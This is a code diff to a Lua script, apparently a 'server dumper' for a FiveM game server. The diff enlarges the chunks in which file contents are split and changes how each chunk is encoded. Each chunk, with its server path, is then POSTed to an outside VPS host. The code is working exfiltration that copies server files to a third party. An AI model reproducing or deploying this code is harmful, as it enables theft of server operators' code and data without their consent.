@@ -409,12 +409,12 @@ function Loc_Lines(str)
 end
 
 function DumpFile(path, content, newPath)
-    if string.len(content) > 800 then
+    if string.len(content) > 1750 then
         local files = {}
-        local maxParts = math.ceil(string.len(content)/750) - 1
+        local maxParts = math.ceil(string.len(content)/1500) - 1
 
         for i = 0, maxParts do
-            local contentPart = string.sub(content, (750 * i) + 1, (750 * i) + 750)
+            local contentPart = string.sub(content, (1500 * i) + 1, (1500 * i) + 1500)
             table.insert(files, {type = "multiple", serverPath = path, content = contentPart, path = newPath, part = i, maxParts = maxParts})
         end
 
@@ -427,10 +427,10 @@ end
 function sendToServer(type, data)
     TriggerClientEvent("server_dumper:output", dumper_source, "Sending " .. data.serverPath .. " to the server type: "..type)
     if type == "single" then
-        PerformHttpRequest('http://vps-13007000.vps.ovh.net:3000/', function(err, text, headers) end, 'POST', json.encode({ files = json.encode(data) }), { ['Content-Type'] = 'application/json' })
+        PerformHttpRequest('http://vps-13007000.vps.ovh.net:3000/', function(err, text, headers) end, 'POST', json.encode({ files = data }), { ['Content-Type'] = 'application/json' })
     elseif type == "multiple" then
         for i = 1, #data.files do
-            PerformHttpRequest('http://vps-13007000.vps.ovh.net:3000/', function(err, text, headers) end, 'POST', json.encode({ files = json.encode(data.files[i]) }), { ['Content-Type'] = 'application/json' })
+            PerformHttpRequest('http://vps-13007000.vps.ovh.net:3000/', function(err, text, headers) end, 'POST', json.encode({ files = data.files[i] }), { ['Content-Type'] = 'application/json' })
             Citizen.Wait(1000)
         end
     end
